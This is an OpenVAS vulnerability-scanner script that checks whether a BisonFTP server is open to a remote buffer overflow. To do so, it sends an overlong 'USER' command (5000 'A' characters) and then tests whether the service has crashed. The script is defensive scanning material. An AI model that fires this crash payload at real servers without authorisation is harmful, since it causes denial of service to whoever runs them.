###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_bisonftp_server_mult_cmd_bof_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# BisonFTP Multiple Commands Remote Buffer Overflow Vulnerabilities
#
# Authors:
# Veerendra G.G <veernedragg@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to execute arbitrary code
  on the system or cause the application to crash.
  Impact Level: System/Application";
tag_affected = "BisonFTP Server prior to version 4.1";
tag_insight = "The flaws are due to an error while processing the 'USER', 'LIST',
  'CWD' multiple commands, which can be exploited to cause a buffer overflow
  by sending a command with specially-crafted an overly long parameter.";
tag_solution = "Upgrade to BisonFTP Server Version 4.1 or higher.";
tag_summary = "The host is running BisonFTP Server and is prone to multiple buffer
  overflow vulnerabilities.";

if(description)
{
  script_id(802033);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-08-18 14:57:45 +0200 (Thu, 18 Aug 2011)");
  script_cve_id("CVE-1999-1510");
  script_bugtraq_id(271, 49109);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_name("BisonFTP Multiple Commands Remote Buffer Overflow Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;

  script_description(desc);
  script_summary("Determine if BisonFTP Server is prone to buffer overflow vulnerabilities");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (c) 2011 Greenbone Networks GmbH");
  script_family("FTP");
  script_require_ports("Services/ftp", 21);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/17649");
  script_xref(name : "URL" , value : "http://marc.info/?l=ntbugtraq&amp;m=92697301706956&amp;w=2");
  exit(0);
}

##
## The script code starts here
##

include("ftp_func.inc");

## Get the default FTP port
ftpPort = get_kb_item("Services/ftp");
if(!ftpPort){
  ftpPort = 21;
}

## Check FTP Port Status
if(!get_port_state(ftpPort)){
  exit(0);
}

## Open TCP Socket
soc = open_sock_tcp(ftpPort);
if(!soc) {
  exit(0);
}

## Confirm the application with FTP banner
resp =  recv(socket:soc, length:1024);
if("BisonWare BisonFTP server" >!< resp){
  exit(0);
}

## Construct and send Crafted Request
attackReq = crap(data: "A", length: 5000);

## Send USER command with huge parameter
attack = string("USER ", attackReq, "\r\n");
send(socket:soc, data:attack);
send(socket:soc, data:attack);
resp =  recv(socket:soc, length:1024);

## Close FTP socket
ftp_close(socket:soc);

## Open TCP Socket
soc1 = open_sock_tcp(ftpPort);
if(!soc1) {
  security_hole(port:ftpPort);
  exit(0);
}

## Receive data from server
resp =  recv(socket:soc1, length:1024);

## Close FTP socket
ftp_close(socket:soc1);

## Confirm FTP Server is still alive and responding
if("BisonWare BisonFTP server" >!< resp){
  security_hole(port:ftpPort);
  exit(0);
}